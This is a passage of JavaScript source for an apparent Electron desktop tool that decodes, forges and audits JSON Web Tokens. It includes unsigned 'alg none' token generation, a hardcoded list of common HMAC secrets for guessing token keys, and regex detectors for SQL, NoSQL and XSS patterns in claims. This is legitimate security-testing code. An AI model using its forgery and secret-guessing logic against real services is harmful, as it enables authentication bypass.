
const { ipcRenderer } = require('electron');
const jwt = require('jsonwebtoken');
const crypto = require('crypto');
const forge = require('node-forge');

/**
 * JWT Security Analyzer - Main application class for JWT security testing
 * Provides comprehensive JWT token analysis, attack vector generation, and security assessment
 * @class
 */
class JWTSecurityAnalyzer {
    /**
     * Creates an instance of JWTSecurityAnalyzer
     * @constructor
     */
    constructor() {
        this.currentTab = 'decoder';
        this.currentToken = null;
        this.bruteForceActive = false;
        this.vulnerabilities = [];
        this.attackPayloads = [];
        this.updateInfo = null;

        this.initializeApp();
        this.updateMaximizeButton();
        this.setupAutoUpdater();
    }

    /**
     * Initializes the main application components and event listeners
     * @method
     */
    initializeApp() {
        this.setupEventListeners();
        this.setupLanguageSelector();
        this.loadAppVersion();
        this.initializeProxy();
        this.initializeReplayAttack();
        this.initializeTokenComparison();
    }

    setupLanguageSelector() {
        const selector = document.getElementById('language-selector');
        if (selector) {
            selector.addEventListener('change', (e) => {
                if (typeof i18n !== 'undefined') {
                    i18n.setLanguage(e.target.value);
                }
            });
        }
    }

    async loadAppVersion() {
        try {
            const result = await ipcRenderer.invoke('get-app-version');
            if (result.success) {
                document.getElementById('modal-current-version').textContent = result.version;
            }
        } catch (error) {
        }
    }

    setupAutoUpdater() {
        ipcRenderer.on('update-checking', () => {
            this.showToast('info', i18n.t('toast.update_checking'));
        });

        ipcRenderer.on('update-available', (event, info) => {
            this.updateInfo = info;
            this.showToast('success', i18n.t('toast.update_available'));
            this.showUpdateModal(info);
        });

        ipcRenderer.on('update-not-available', () => {
            this.showToast('info', i18n.t('toast.update_not_available'));
        });

        ipcRenderer.on('update-download-progress', (event, progress) => {
            this.updateDownloadProgress(progress);
        });

        ipcRenderer.on('update-downloaded', (event, info) => {
            this.showToast('success', i18n.t('toast.update_downloaded'));
            this.showUpdateReadyModal(info);
        });

        ipcRenderer.on('update-error', (event, error) => {
            this.showToast('error', i18n.t('toast.update_error'));
        });

        ipcRenderer.on('jwt-token-captured', (event, tokenData) => {
            this.addCapturedToken(tokenData);
            this.showToast('info', `${i18n.t('toast.jwt_captured')} ${tokenData.source}`);
        });
    }

    showUpdateModal(updateInfo) {
        const modal = document.getElementById('update-modal');
        const newVersionElement = document.getElementById('modal-new-version');
        const releaseNotesElement = document.getElementById('release-notes-content');

        if (newVersionElement && updateInfo.version) {
            newVersionElement.textContent = updateInfo.version;
        }

        if (releaseNotesElement && updateInfo.releaseNotes) {
            releaseNotesElement.textContent = updateInfo.releaseNotes;
        }

        modal.style.display = 'block';

        document.getElementById('install-update').onclick = () => {
            this.downloadAndInstallUpdate();
            modal.style.display = 'none';
        };

        document.getElementById('install-later').onclick = () => {
            modal.style.display = 'none';
        };

        document.getElementById('skip-update').onclick = () => {
            modal.style.display = 'none';
        };
    }

    showUpdateReadyModal(updateInfo) {
        const modal = document.getElementById('update-modal');
        const installButton = document.getElementById('install-update');

        installButton.innerHTML = `<i class="fas fa-sync-alt"></i> ${i18n.t('updater.install_now')}`;
        installButton.onclick = () => {
            this.restartAndInstall();
        };

        modal.style.display = 'block';
    }

    updateDownloadProgress(progress) {
        const progressElement = document.getElementById('download-progress');
        const percentageElement = document.getElementById('download-percentage');
        const fillElement = document.getElementById('download-progress-fill');

        if (progressElement) {
            progressElement.style.display = 'block';
        }

        if (percentageElement) {
            percentageElement.textContent = `${Math.round(progress.percent)}%`;
        }

        if (fillElement) {
            fillElement.style.width = `${progress.percent}%`;
        }
    }

    async downloadAndInstallUpdate() {
        try {
            const result = await ipcRenderer.invoke('download-update');
            if (!result.success) {
                this.showToast('error', `${i18n.t('updater.error')}: ${result.error}`);
            }
        } catch (error) {
            this.showToast('error', `${i18n.t('updater.error')}: ${error.message}`);
        }
    }

    async restartAndInstall() {
        try {
            await ipcRenderer.invoke('install-update');
        } catch (error) {
            this.showToast('error', `${i18n.t('updater.error')}: ${error.message}`);
        }
    }

    async checkForUpdates() {
        this.showToast('info', i18n.t('updater.checking'));
        try {
            const result = await ipcRenderer.invoke('check-for-updates');
            if (!result.success) {
                this.showToast('error', `${i18n.t('updater.error')}: ${result.error}`);
            }
        } catch (error) {
            this.showToast('error', `${i18n.t('updater.error')}: ${error.message}`);
        }
    }

    setupEventListeners() {
        document.getElementById('minimize-btn').addEventListener('click', async () => {
            await ipcRenderer.invoke('window-minimize');
        });

        document.getElementById('maximize-btn').addEventListener('click', async () => {
            await ipcRenderer.invoke('window-maximize');
            const isMaximized = await ipcRenderer.invoke('window-is-maximized');
            const icon = document.querySelector('#maximize-btn i');
            if (isMaximized) {
                icon.className = 'fas fa-window-restore';
            } else {
                icon.className = 'fas fa-window-maximize';
            }
        });

        document.getElementById('close-btn').addEventListener('click', async () => {
            await ipcRenderer.invoke('window-close');
        });

        document.getElementById('check-updates-btn').addEventListener('click', () => {
            this.checkForUpdates();
        });

        document.querySelectorAll('.nav-item').forEach(item => {
            item.addEventListener('click', () => {
                const tab = item.dataset.tab;
                this.switchTab(tab);
            });
        });

        document.querySelectorAll('.nav-section-header').forEach(header => {
            header.addEventListener('click', () => {
                this.toggleNavSection(header);
            });
        });

        document.getElementById('jwt-input').addEventListener('input', (e) => {
            this.decodeJWT(e.target.value);
        });

        document.getElementById('decode-btn').addEventListener('click', () => {
            const token = document.getElementById('jwt-input').value;
            this.decodeJWT(token);
        });

        document.getElementById('clear-decode-btn').addEventListener('click', () => {
            document.getElementById('jwt-input').value = '';
            document.getElementById('jwt-decode-results').style.display = 'none';
            document.getElementById('claims-analysis').style.display = 'none';
        });

        document.getElementById('example-token-btn').addEventListener('click', () => {
            this.loadExampleToken();
        });

        document.getElementById('send-to-encoder-btn').addEventListener('click', () => {
            this.sendToEncoder();
        });

        document.getElementById('encode-jwt-btn').addEventListener('click', () => {
            this.encodeJWT();
        });

        document.getElementById('clear-encoder-btn').addEventListener('click', () => {
            this.clearEncoder();
        });

        document.getElementById('load-template-btn').addEventListener('click', () => {
            this.loadTemplate();
        });

        document.getElementById('copy-generated-token').addEventListener('click', () => {
            const token = document.getElementById('generated-token').value;
            this.copyToClipboard(token);
        });

        document.getElementById('test-generated-token').addEventListener('click', () => {
            const token = document.getElementById('generated-token').value;
            this.switchTab('validator');
            document.getElementById('validator-jwt-input').value = token;
        });

        document.getElementById('analyze-security-btn').addEventListener('click', () => {
            this.analyzeTokenSecurity();
        });

        document.querySelectorAll('.attack-generate-btn').forEach(btn => {
            btn.addEventListener('click', (e) => {
                const attackType = e.target.closest('.attack-card').dataset.attack;
                this.generateAttack(attackType);
            });
        });

        document.querySelectorAll('.attack-info-btn').forEach(btn => {
            btn.addEventListener('click', (e) => {
                const attackType = e.target.closest('.attack-card').dataset.attack;
                this.showAttackExplanation(attackType);
            });
        });

        document.getElementById('close-attack-explanation').addEventListener('click', () => {
            this.closeAttackExplanation();
        });

        document.getElementById('close-attack-explanation-btn').addEventListener('click', () => {
            this.closeAttackExplanation();
        });

        document.getElementById('start-bruteforce').addEventListener('click', () => {
            this.startBruteForce();
        });

        document.getElementById('stop-bruteforce').addEventListener('click', () => {
            this.stopBruteForce();
        });

        document.getElementById('load-common-secrets').addEventListener('click', () => {
            this.loadCommonSecrets();
        });

        document.getElementById('generate-hmac-secret').addEventListener('click', () => {
            this.generateHMACSecret();
        });

        document.getElementById('generate-rsa-keys').addEventListener('click', () => {
            this.generateRSAKeys();
        });

        document.getElementById('validate-token').addEventListener('click', () => {
            this.validateToken();
        });

        document.getElementById('validate-signature-only').addEventListener('click', () => {
            this.validateSignatureOnly();
        });

        document.getElementById('send-request').addEventListener('click', () => {
            this.sendHTTPRequest();
        });

        document.getElementById('load-wordlist-file').addEventListener('click', async () => {
            await this.loadWordlistFile();
        });

        document.getElementById('encode-base64').addEventListener('click', () => {
            this.encodeBase64();
        });

        document.getElementById('decode-base64').addEventListener('click', () => {
            this.decodeBase64();
        });

        document.querySelectorAll('.copy-btn').forEach(btn => {
            btn.addEventListener('click', (e) => {
                const copyType = e.target.closest('.copy-btn').dataset.copy;
                this.copyJWTPart(copyType);
            });
        });

        document.getElementById('copy-hmac-secret').addEventListener('click', () => {
            const secret = document.getElementById('hmac-secret').value;
            this.copyToClipboard(secret);
        });

        document.getElementById('copy-private-key').addEventListener('click', () => {
            const key = document.getElementById('rsa-private-key').value;
            this.copyToClipboard(key);
        });

        document.getElementById('copy-public-key').addEventListener('click', () => {
            const key = document.getElementById('rsa-public-key').value;
            this.copyToClipboard(key);
        });

        document.getElementById('copy-cracked-secret').addEventListener('click', () => {
            const secret = document.getElementById('cracked-secret-value').textContent;
            this.copyToClipboard(secret);
        });

        document.getElementById('use-secret-encoder').addEventListener('click', () => {
            const secret = document.getElementById('cracked-secret-value').textContent;
            this.switchTab('encoder');
            document.getElementById('jwt-secret').value = secret;
        });

        document.getElementById('generate-new-tokens').addEventListener('click', () => {
            const secret = document.getElementById('cracked-secret-value').textContent;
            this.generateNewTokensWithSecret(secret);
        });

        document.body.addEventListener('click', (e) => {
            if (e.target.matches('.dynamic-copy-btn') || e.target.closest('.dynamic-copy-btn')) {
                e.preventDefault();
                e.stopPropagation();

                const button = e.target.matches('.dynamic-copy-btn') ? e.target : e.target.closest('.dynamic-copy-btn');
                const targetId = button.getAttribute('data-target');

                if (targetId) {
                    const targetElement = document.getElementById(targetId);
                    if (targetElement) {
                        this.copyToClipboard(targetElement.value || targetElement.textContent);
                    }
                }
                return false;
            }

            if (e.target.matches('.http-tab') || e.target.closest('.http-tab')) {
                e.preventDefault();
                const tab = e.target.matches('.http-tab') ? e.target : e.target.closest('.http-tab');
                const tabName = tab.getAttribute('data-tab');
                if (tabName) {
                    this.switchHTTPTab(tabName);
                }
                return false;
            }

            if (e.target.matches('.response-tab') || e.target.closest('.response-tab')) {
                e.preventDefault();
                const tab = e.target.matches('.response-tab') ? e.target : e.target.closest('.response-tab');
                const tabName = tab.getAttribute('data-tab');
                if (tabName) {
                    this.switchResponseTab(tabName);
                }
                return false;
            }
        });
    }

    showAttackExplanation(attackType) {
        const modal = document.getElementById('attack-explanation-modal');
        const titleElement = document.getElementById('attack-explanation-title');
        const textElement = document.getElementById('attack-explanation-text');

        const explanationKey = `attacks.how_${attackType.replace('-', '_')}_works`;
        const explanation = i18n.t(explanationKey);

        const titleKey = `attacks.${attackType.replace('-', '_')}`;
        const title = i18n.t(titleKey);

        titleElement.textContent = title;
        textElement.textContent = explanation;

        modal.style.display = 'block';
    }

    closeAttackExplanation() {
        const modal = document.getElementById('attack-explanation-modal');
        modal.style.display = 'none';
    }

    async updateMaximizeButton() {
        const isMaximized = await ipcRenderer.invoke('window-is-maximized');
        const icon = document.querySelector('#maximize-btn i');
        if (icon) {
            if (isMaximized) {
                icon.className = 'fas fa-window-restore';
            } else {
                icon.className = 'fas fa-window-maximize';
            }
        }
    }

    switchTab(tabName) {
        document.querySelectorAll('.tab-content').forEach(tab => {
            tab.classList.remove('active');
        });
        document.querySelectorAll('.nav-item').forEach(item => {
            item.classList.remove('active');
        });

        document.getElementById(`${tabName}-tab`).classList.add('active');
        document.querySelector(`[data-tab="${tabName}"]`).classList.add('active');
        this.currentTab = tabName;
    }

    toggleNavSection(header) {
        const content = header.nextElementSibling;
        const isExpanded = content.classList.contains('expanded');
        
        if (isExpanded) {
            content.classList.remove('expanded');
            header.classList.add('collapsed');
        } else {
            content.classList.add('expanded');
            header.classList.remove('collapsed');
        }
    }

    switchHTTPTab(tabName) {
        document.querySelectorAll('.http-tab').forEach(tab => {
            tab.classList.remove('active');
        });
        document.querySelectorAll('.http-tab-pane').forEach(pane => {
            pane.classList.remove('active');
        });

        const targetTab = document.querySelector(`.http-tab[data-tab="${tabName}"]`);
        const targetPane = document.getElementById(`${tabName}-pane`);

        if (targetTab) targetTab.classList.add('active');
        if (targetPane) targetPane.classList.add('active');
    }

    switchResponseTab(tabName) {
        document.querySelectorAll('.response-tab').forEach(tab => {
            tab.classList.remove('active');
        });
        document.querySelectorAll('.response-tab-pane').forEach(pane => {
            pane.classList.remove('active');
        });

        const targetTab = document.querySelector(`.response-tab[data-tab="${tabName}"]`);
        const targetPane = document.getElementById(`${tabName}-pane`);

        if (targetTab) targetTab.classList.add('active');
        if (targetPane) targetPane.classList.add('active');
    }

    loadExampleToken() {
        const exampleToken = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c';
        document.getElementById('jwt-input').value = exampleToken;
        this.decodeJWT(exampleToken);
    }

    sendToEncoder() {
        if (!this.currentToken) {
            this.showToast('error', i18n.t('toast.no_token_data'));
            return;
        }

        try {
            this.switchTab('encoder');

            const headerJson = JSON.stringify(this.currentToken.header, null, 2);
            document.getElementById('jwt-header-input').value = headerJson;

            const payloadJson = JSON.stringify(this.currentToken.payload, null, 2);
            document.getElementById('jwt-payload-input').value = payloadJson;

            const algorithm = this.currentToken.header.alg || 'HS256';
            document.getElementById('jwt-algorithm').value = algorithm;

            document.getElementById('jwt-secret').value = '';
            document.getElementById('generated-token-result').style.display = 'none';

            this.showToast('success', i18n.t('toast.token_sent_encoder'));

        } catch (error) {
            this.showToast('error', `${i18n.t('toast.token_sent_encoder')}: ${error.message}`);
        }
    }

    /**
     * Decodes a JWT token and displays its header, payload, and signature
     * @method
     * @param {string} token - The JWT token to decode
     */
    decodeJWT(token) {
        if (!token || token.trim() === '') {
            document.getElementById('jwt-decode-results').style.display = 'none';
            document.getElementById('claims-analysis').style.display = 'none';
            return;
        }

        if (token.length > 100000) {
            this.showToast('error', i18n.t('toast.token_too_large'));
            return;
        }

        try {
            const parts = token.split('.');
            if (parts.length !== 3) {
                throw new Error('Invalid JWT format');
            }

            if (parts[0].length > 10000 || parts[1].length > 50000 || parts[2].length > 10000) {
                throw new Error('JWT part too large');
            }

            const header = JSON.parse(this.base64UrlDecode(parts[0]));
            const payload = JSON.parse(this.base64UrlDecode(parts[1]));
            const signature = parts[2];

            this.currentToken = { header, payload, signature, raw: token };

            document.getElementById('jwt-header-raw').textContent = parts[0];
            document.getElementById('jwt-header-decoded').textContent = JSON.stringify(header, null, 2);
            document.getElementById('jwt-payload-raw').textContent = parts[1];
            document.getElementById('jwt-payload-decoded').textContent = JSON.stringify(payload, null, 2);
            document.getElementById('jwt-signature-raw').textContent = signature;

            document.getElementById('token-algorithm').textContent = header.alg || 'Unknown';
            document.getElementById('signature-algorithm').textContent = header.alg || 'Unknown';
            document.getElementById('signature-length').textContent = `${signature.length} chars`;

            this.analyzeClaims(payload);
            this.analyzeSignature(header, signature);

            document.getElementById('jwt-decode-results').style.display = 'block';
            document.getElementById('claims-analysis').style.display = 'block';

        } catch (error) {
            this.showToast('error', i18n.t('toast.invalid_token'));
            document.getElementById('jwt-decode-results').style.display = 'none';
            document.getElementById('claims-analysis').style.display = 'none';
        }
    }

    analyzeClaims(payload) {
        const claimsGrid = document.getElementById('claims-grid');
        claimsGrid.innerHTML = '';

        const standardClaims = {
            'iss': i18n.t('claims.issuer'),
            'sub': i18n.t('claims.subject'),
            'aud': i18n.t('claims.audience'),
            'exp': i18n.t('claims.expiration'),
            'nbf': i18n.t('claims.not_before'),
            'iat': i18n.t('claims.issued_at'),
            'jti': i18n.t('claims.jwt_id')
        };

        Object.entries(payload).forEach(([key, value]) => {
            const claimItem = document.createElement('div');
            claimItem.className = 'claim-item';

            const claimName = document.createElement('div');
            claimName.className = 'claim-name';
            claimName.textContent = standardClaims[key] || key;

            const claimValue = document.createElement('div');
            claimValue.className = 'claim-value';

            if (key === 'exp' || key === 'nbf' || key === 'iat') {
                const date = new Date(value * 1000);
                claimValue.textContent = `${value} (${date.toLocaleString()})`;
            } else {
                claimValue.textContent = typeof value === 'object' ? JSON.stringify(value) : value;
            }

            if (standardClaims[key]) {
                const claimDescription = document.createElement('div');
                claimDescription.className = 'claim-description';
                claimDescription.textContent = this.getClaimDescription(key);
                claimItem.appendChild(claimDescription);
            }

            claimItem.appendChild(claimName);
            claimItem.appendChild(claimValue);
            claimsGrid.appendChild(claimItem);
        });
    }

    getClaimDescription(claim) {
        const descriptions = {
            'iss': i18n.t('claims.issuer_desc'),
            'sub': i18n.t('claims.subject_desc'),
            'aud': i18n.t('claims.audience_desc'),
            'exp': i18n.t('claims.expiration_desc'),
            'nbf': i18n.t('claims.not_before_desc'),
            'iat': i18n.t('claims.issued_at_desc'),
            'jti': i18n.t('claims.jwt_id_desc')
        };
        return descriptions[claim] || '';
    }

    analyzeSignature(header, signature) {
        const statusElement = document.getElementById('signature-status');

        if (header.alg === 'none') {
            statusElement.textContent = i18n.t('decoder.no_signature');
            statusElement.className = 'signature-value signature-status invalid';
        } else if (signature.length === 0) {
            statusElement.textContent = i18n.t('decoder.missing');
            statusElement.className = 'signature-value signature-status invalid';
        } else {
            statusElement.textContent = i18n.t('decoder.present');
            statusElement.className = 'signature-value signature-status valid';
        }
    }

    encodeJWT() {
        try {
            const headerInput = document.getElementById('jwt-header-input').value;
            const payloadInput = document.getElementById('jwt-payload-input').value;
            const algorithm = document.getElementById('jwt-algorithm').value;
            const secret = document.getElementById('jwt-secret').value;

            if (!headerInput || !payloadInput) {
                this.showToast('error', i18n.t('toast.provide_header_payload'));
                return;
            }

            const header = JSON.parse(headerInput);
            const payload = JSON.parse(payloadInput);
            header.alg = algorithm;

            let token;
            if (algorithm === 'none') {
                const headerB64 = this.base64UrlEncode(JSON.stringify(header));
                const payloadB64 = this.base64UrlEncode(JSON.stringify(payload));
                token = `${headerB64}.${payloadB64}.`;
            } else if (algorithm.startsWith('HS')) {
                if (!secret) {
                    this.showToast('error', i18n.t('toast.hmac_secret_required'));
                    return;
                }
                token = jwt.sign(payload, secret, {
                    algorithm: algorithm,
                    header: header,
                    noTimestamp: true
                });
            } else if (algorithm.startsWith('RS')) {
                if (!secret) {
                    this.showToast('error', i18n.t('toast.rsa_key_required'));
                    return;
                }
                token = jwt.sign(payload, secret, {
                    algorithm: algorithm,
                    header: header,
                    noTimestamp: true
                });
            }

            document.getElementById('generated-token').value = token;
            document.getElementById('generated-token-result').style.display = 'block';

            this.validateGeneratedToken(token, secret);
            this.showToast('success', i18n.t('toast.token_generated'));

        } catch (error) {
            this.showToast('error', `${i18n.t('toast.token_generation_failed')}: ${error.message}`);
        }
    }

    validateGeneratedToken(token, secret) {
        const validationContainer = document.getElementById('token-validation');
        validationContainer.innerHTML = '';

        try {
            const decoded = jwt.decode(token, { complete: true });

            const validationItem = document.createElement('div');
            validationItem.className = 'validation-item success';
            validationItem.innerHTML = `
                <i class="fas fa-check-circle"></i>
                <span>Token structure is valid</span>
            `;
            validationContainer.appendChild(validationItem);

            if (decoded.header.alg !== 'none' && secret) {
                try {
                    jwt.verify(token, secret, { algorithms: [decoded.header.alg] });
                    const signatureItem = document.createElement('div');
                    signatureItem.className = 'validation-item success';
                    signatureItem.innerHTML = `
                        <i class="fas fa-shield-alt"></i>
                        <span>Signature is valid</span>
                    `;
                    validationContainer.appendChild(signatureItem);
                } catch (e) {
                    const signatureItem = document.createElement('div');
                    signatureItem.className = 'validation-item error';
                    signatureItem.innerHTML = `
                        <i class="fas fa-exclamation-triangle"></i>
                        <span>Signature verification failed</span>
                    `;
                    validationContainer.appendChild(signatureItem);
                }
            }

            const now = Math.floor(Date.now() / 1000);
            if (decoded.payload.exp && decoded.payload.exp < now) {
                const expiredItem = document.createElement('div');
                expiredItem.className = 'validation-item warning';
                expiredItem.innerHTML = `
                    <i class="fas fa-clock"></i>
                    <span>Token is expired</span>
                `;
                validationContainer.appendChild(expiredItem);
            }

        } catch (error) {
            const errorItem = document.createElement('div');
            errorItem.className = 'validation-item error';
            errorItem.innerHTML = `
                <i class="fas fa-times-circle"></i>
                <span>Token validation failed: ${error.message}</span>
            `;
            validationContainer.appendChild(errorItem);
        }
    }

    clearEncoder() {
        document.getElementById('jwt-header-input').value = '';
        document.getElementById('jwt-payload-input').value = '';
        document.getElementById('jwt-secret').value = '';
        document.getElementById('generated-token-result').style.display = 'none';
    }

    loadTemplate() {
        const templates = {
            basic: {
                header: '{"alg": "HS256", "typ": "JWT"}',
                payload: '{\n  "sub": "1234567890",\n  "name": "John Doe",\n  "iat": ' + Math.floor(Date.now() / 1000) + '\n}'
            },
            admin: {
                header: '{"alg": "HS256", "typ": "JWT"}',
                payload: '{\n  "sub": "admin",\n  "name": "Administrator",\n  "role": "admin",\n  "permissions": ["read", "write", "delete"],\n  "iat": ' + Math.floor(Date.now() / 1000) + ',\n  "exp": ' + (Math.floor(Date.now() / 1000) + 3600) + '\n}'
            }
        };

        const template = templates.basic;
        document.getElementById('jwt-header-input').value = template.header;
        document.getElementById('jwt-payload-input').value = template.payload;
    }

    analyzeTokenSecurity() {
        const token = document.getElementById('security-jwt-input').value;
        if (!token) {
            this.showToast('error', i18n.t('toast.provide_token_analyze'));
            return;
        }

        try {
            const decoded = jwt.decode(token, { complete: true });
            this.vulnerabilities = [];

            this.checkAlgorithmSecurity(decoded.header, token);
            this.checkClaimsSecurity(decoded.payload);
            this.checkSignatureSecurity(decoded.header, token);
            this.checkTokenStructure(token);
            this.checkModernVulnerabilities(decoded.header, decoded.payload);
            this.checkComplianceAndBestPractices(decoded.header, decoded.payload);
            this.checkStatisticalAndBehavioralPatterns(decoded.header, decoded.payload);

            this.displaySecurityResults();

        } catch (error) {
            this.showToast('error', `${i18n.t('toast.security_analysis_failed')}: ${error.message}`);
        }
    }

    checkAlgorithmSecurity(header, token) {
        if (header.alg === 'none') {
            this.vulnerabilities.push({
                severity: 'critical',
                title: i18n.t('vulns.algorithm_none'),
                description: i18n.t('vulns.algorithm_none_desc'),
                impact: i18n.t('vulns.algorithm_none_impact'),
                recommendation: i18n.t('vulns.algorithm_none_rec')
            });
        }

        const deprecatedAlgorithms = ['HS1', 'RS1', 'ES1', 'PS1'];
        if (deprecatedAlgorithms.includes(header.alg)) {
            this.vulnerabilities.push({
                severity: 'high',
                title: 'Deprecated Algorithm',
                description: `Token uses deprecated algorithm ${header.alg}`,
                impact: 'Known cryptographic weaknesses and security vulnerabilities',
                recommendation: 'Upgrade to modern algorithms (HS256+, RS256+, ES256+)'
            });
        }

        if (header.alg === 'HS256') {
            this.vulnerabilities.push({
                severity: 'medium',
                title: i18n.t('vulns.weak_algorithm'),
                description: i18n.t('vulns.weak_algorithm_desc'),
                impact: i18n.t('vulns.weak_algorithm_impact'),
                recommendation: i18n.t('vulns.weak_algorithm_rec')
            });

            this.performActiveSecretTesting(token);
        }

        if (!header.alg) {
            this.vulnerabilities.push({
                severity: 'high',
                title: i18n.t('vulns.missing_algorithm'),
                description: i18n.t('vulns.missing_algorithm_desc'),
                impact: i18n.t('vulns.missing_algorithm_impact'),
                recommendation: i18n.t('vulns.missing_algorithm_rec')
            });
        }

        const customAlgorithms = /^[A-Z0-9]+[0-9]+$/;
        if (header.alg && !['HS256', 'HS384', 'HS512', 'RS256', 'RS384', 'RS512', 'ES256', 'ES384', 'ES512', 'PS256', 'PS384', 'PS512', 'none'].includes(header.alg)) {
            if (customAlgorithms.test(header.alg)) {
                this.vulnerabilities.push({
                    severity: 'medium',
                    title: 'Custom Algorithm Detection',
                    description: `Token uses non-standard algorithm: ${header.alg}`,
                    impact: 'Custom algorithms may bypass security validation',
                    recommendation: 'Use only standard, well-tested JWT algorithms'
                });
            }
        }

        if (header.alg && header.alg.toLowerCase() !== header.alg && header.alg.toUpperCase() !== header.alg) {
            this.vulnerabilities.push({
                severity: 'low',
                title: 'Algorithm Case Inconsistency',
                description: 'Algorithm field uses mixed case which may cause parser confusion',
                impact: 'Potential algorithm validation bypass in case-sensitive parsers',
                recommendation: 'Use consistent uppercase algorithm names'
            });
        }
    }

    performActiveSecretTesting(token) {
        const commonSecrets = [
            'secret', 'key', 'password', 'jwt', 'token', 'auth', 'hmac',
            'secret123', 'password123', 'key123', 'jwt123', 'test', 'admin',
            'your-256-bit-secret', 'your-secret-key', 'my-secret', 'super-secret'
        ];

        for (const secret of commonSecrets) {
            try {
                jwt.verify(token, secret);
                this.vulnerabilities.push({
                    severity: 'critical',
                    title: 'Weak Secret Detected',
                    description: `Token uses weak/common secret: "${secret}"`,
                    impact: 'Complete authentication bypass - token can be forged',
                    recommendation: 'Use cryptographically secure random secrets (256+ bits)'
                });
                break;
            } catch (e) {
                continue;
            }
        }
    }

    checkClaimsSecurity(payload) {
        const now = Math.floor(Date.now() / 1000);

        if (!payload.exp) {
            this.vulnerabilities.push({
                severity: 'medium',
                title: i18n.t('vulns.missing_expiration'),
                description: i18n.t('vulns.missing_expiration_desc'),
                impact: i18n.t('vulns.missing_expiration_impact'),
                recommendation: i18n.t('vulns.missing_expiration_rec')
            });
        } else {
            if (payload.exp < now) {
                this.vulnerabilities.push({
                    severity: 'low',
                    title: i18n.t('vulns.expired_token'),
                    description: i18n.t('vulns.expired_token_desc'),
                    impact: i18n.t('vulns.expired_token_impact'),
                    recommendation: i18n.t('vulns.expired_token_rec')
                });
            }

            const maxLifetime = 86400 * 30;
            if (payload.iat && (payload.exp - payload.iat) > maxLifetime) {
                this.vulnerabilities.push({
                    severity: 'medium',
                    title: 'Excessive Token Lifetime',
                    description: `Token lifetime exceeds 30 days (${Math.floor((payload.exp - payload.iat) / 86400)} days)`,
                    impact: 'Long-lived tokens increase risk if compromised',
                    recommendation: 'Limit token lifetime to business requirements (typically 1-24 hours)'
                });
            }
        }

        if (!payload.iat) {
            this.vulnerabilities.push({
                severity: 'low',
                title: i18n.t('vulns.missing_issued_at'),
                description: i18n.t('vulns.missing_issued_at_desc'),
                impact: i18n.t('vulns.missing_issued_at_impact'),
                recommendation: i18n.t('vulns.missing_issued_at_rec')
            });
        } else {
            if (payload.iat > now + 300) {
                this.vulnerabilities.push({
                    severity: 'medium',
                    title: 'Future Issued Time',
                    description: 'Token issued time is in the future',
                    impact: 'May indicate token replay or clock synchronization issues',
                    recommendation: 'Validate issued time against current time with appropriate tolerance'
                });
            }
        }

        if (!payload.iss) {
            this.vulnerabilities.push({
                severity: 'low',
                title: i18n.t('vulns.missing_issuer'),
                description: i18n.t('vulns.missing_issuer_desc'),
                impact: i18n.t('vulns.missing_issuer_impact'),
                recommendation: i18n.t('vulns.missing_issuer_rec')
            });
        } else {
            const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
            const urlRegex = /^https?:\/\/.+/;
            if (typeof payload.iss === 'string' && !emailRegex.test(payload.iss) && !urlRegex.test(payload.iss) && payload.iss.length > 100) {
                this.vulnerabilities.push({
                    severity: 'low',
                    title: 'Invalid Issuer Format',
                    description: 'Issuer claim does not follow standard format (URL or email)',
                    impact: 'May cause interoperability issues',
                    recommendation: 'Use valid URL or email format for issuer claim'
                });
            }
        }

        const dangerousPatterns = {
            role: ['super', 'root', 'system', 'service'],
            permissions: ['*', 'all', 'admin:*', 'root:*'],
            scope: ['admin:*', 'system:*', '*:*'],
            debug: [true, 'true', '1'],
            test_mode: [true, 'true', '1'],
            elevated: [true, 'true', '1']
        };

        Object.entries(dangerousPatterns).forEach(([claim, patterns]) => {
            if (payload[claim]) {
                const value = Array.isArray(payload[claim]) ? payload[claim] : [payload[claim]];
                const dangerous = value.some(v =>
                    patterns.some(p =>
                        typeof v === 'string' ? v.toLowerCase().includes(p.toString().toLowerCase()) : v === p
                    )
                );

                if (dangerous) {
                    this.vulnerabilities.push({
                        severity: payload[claim] === 'admin' || payload[claim] === 'root' ? 'high' : 'medium',
                        title: 'Dangerous Privilege Pattern',
                        description: `Token contains potentially dangerous ${claim}: ${JSON.stringify(payload[claim])}`,
                        impact: 'Elevated privileges may indicate compromised or test tokens',
                        recommendation: 'Implement principle of least privilege and avoid wildcard permissions'
                    });
                }
            }
        });

        Object.entries(payload).forEach(([key, value]) => {
            if (typeof value === 'string') {
                const sqlPatterns = /\b(union|select|drop|insert|update|delete|exec|execute|sp_|xp_)\b/i;
                const noSQLPatterns = /(\$where|\$ne|\$gt|\$lt|\$regex|javascript:)/i;
                const xssPatterns = /<script|javascript:|on\w+\s*=/i;

                if (sqlPatterns.test(value)) {
                    this.vulnerabilities.push({
                        severity: 'high',
                        title: 'SQL Injection Pattern in Claims',
                        description: `Claim "${key}" contains potential SQL injection: ${value.substring(0, 100)}`,
                        impact: 'May lead to database compromise if claims are used in queries',
                        recommendation: 'Validate and sanitize all claim values before database operations'
                    });
                }

                if (noSQLPatterns.test(value)) {
                    this.vulnerabilities.push({
                        severity: 'high',
                        title: 'NoSQL Injection Pattern in Claims',
                        description: `Claim "${key}" contains potential NoSQL injection: ${value.substring(0, 100)}`,
                        impact: 'May lead to NoSQL database compromise',
                        recommendation: 'Validate claim values and use parameterized NoSQL operations'
                    });
                }

                if (xssPatterns.test(value)) {
                    this.vulnerabilities.push({
                        severity: 'medium',
                        title: 'XSS Pattern in Claims',
                        description: `Claim "${key}" contains potential XSS payload: ${value.substring(0, 100)}`,
                        impact: 'May lead to cross-site scripting if claims are displayed in web pages',
                        recommendation: 'Sanitize claim values before displaying in web contexts'
                    });
                }
            }
        });

        if (payload.iat && payload.nbf && payload.exp) {
            if (payload.nbf > payload.exp) {
                this.vulnerabilities.push({
                    severity: 'high',
                    title: 'Invalid Time Relationship',
                    description: 'Not-before time is after expiration time',
                    impact: 'Token can never be valid due to logical time inconsistency',
                    recommendation: 'Ensure nbf <= iat <= exp time relationship'
                });
            }
            if (payload.iat > payload.exp) {
                this.vulnerabilities.push({
                    severity: 'high',
                    title: 'Invalid Time Relationship',
                    description: 'Issued time is after expiration time',
                    impact: 'Token was already expired when issued',
                    recommendation: 'Ensure iat < exp time relationship'
                });
            }
        }

